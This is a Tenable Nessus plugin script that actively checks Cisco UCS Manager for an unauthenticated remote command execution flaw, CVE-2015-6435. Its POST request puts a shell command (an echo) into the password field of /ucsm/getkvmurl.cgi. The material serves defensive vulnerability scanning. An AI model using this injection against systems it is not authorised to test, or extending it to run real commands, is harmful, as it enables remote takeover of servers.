#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(88589);
  script_version("$Revision: 1.2 $");
  script_cvs_date("$Date: 2016/04/28 18:15:08 $");

  script_cve_id("CVE-2015-6435");
  script_osvdb_id(133392);
  script_xref(name:"CISCO-SA", value:"cisco-sa-20160120-ucsm");
  script_xref(name:"CISCO-BUG-ID", value:"CSCur90888");

  script_name(english:"Cisco Unified Computing System Manager CGI RCE (CSCur90888) (remote check)");
  script_summary(english:"Checks response from the UCS manager.");

  script_set_attribute(attribute:"synopsis", value:
"The remote device is affected by a remote command execution
vulnerability.");
  script_set_attribute(attribute:"description", value:
"The Cisco Unified Computing System (UCS) Manager running on the remote
device is affected by a remote command execution vulnerability due to
unprotected calling of shell commands in the /ucsm/getkvmurl.cgi CGI
script. An unauthenticated, remote attacker can exploit this, via a
crafted HTTP request, to execute arbitrary commands.");
  # http://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20160120-ucsm
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?72dbb5d7");
  script_set_attribute(attribute:"solution", value:
"Refer to Cisco bug ID CSCur90888 for any available patches, or contact
the vendor for a fix.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2016/01/20");
  script_set_attribute(attribute:"patch_publication_date", value:"2016/01/20");
  script_set_attribute(attribute:"plugin_publication_date", value:"2016/02/05");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:cisco:unified_computing_system");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2016 Tenable Network Security, Inc.");

  script_dependencies("cisco_ucs_manager_version.nasl");
  script_require_keys("installed_sw/cisco_ucs_manager");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("install_func.inc");

app = "Cisco UCS Manager";
get_install_count(app_name:"cisco_ucs_manager", exit_if_zero:TRUE);

port = get_http_port(default:80);
install = get_single_install(app_name:"cisco_ucs_manager", port:port);

url = build_url(qs:install["path"], port:port);

# Inject an echo command to cause a vulnerable and a patched UCSM 
# to send back a different string in the response 
data = 'username="A"&password="B\' http://localhost/; echo outCookie= ; #"';

res = http_send_recv3(
  port            : port,
  method          : "POST",
  item            : "/ucsm/getkvmurl.cgi",
  data            : data,
  content_type    : "application/x-www-form-urlencoded",
  exit_on_fail    : TRUE
);

if(res[0] =~ "^HTTP/[0-9.]+ 200") 
{
  if(res[2])
  {
    # Vulnerable
    if("GetKVMLaunchUrl:" >< res[2])
    {
      security_hole(port:port);   
    }
    # Patched
    else if ("UCSM cluster IP is inaccessible. Error Code:" >< res[2])
    {
      audit(AUDIT_WEB_APP_NOT_AFFECTED, "Cisco UCS Manager", url);
    }
    # Unexpected response body
    else
    {
      body = res[2];
      if(strlen(res[2]) > 128)
      {
        body = substr(res[2], 0, 127) + '...(truncated)'; 
      } 
      audit(AUDIT_RESP_BAD, port, 'a POST request, unexpected response body:\n' + body);
    }
  }
  else
    audit(AUDIT_RESP_BAD, port, "a POST request: no response body");
}
# UCSM versions 2.1 and earlier do not have getkvmurl.cgi
else if(res[0] =~ "^HTTP/[0-9.]+ 404") 
  audit(AUDIT_WEB_APP_NOT_AFFECTED, 'Cisco UCS Manager', url);
# Unexpected response status
else
  audit(AUDIT_RESP_BAD, port, 'a POST request, unexpected response status: \n' + res[0]);
  
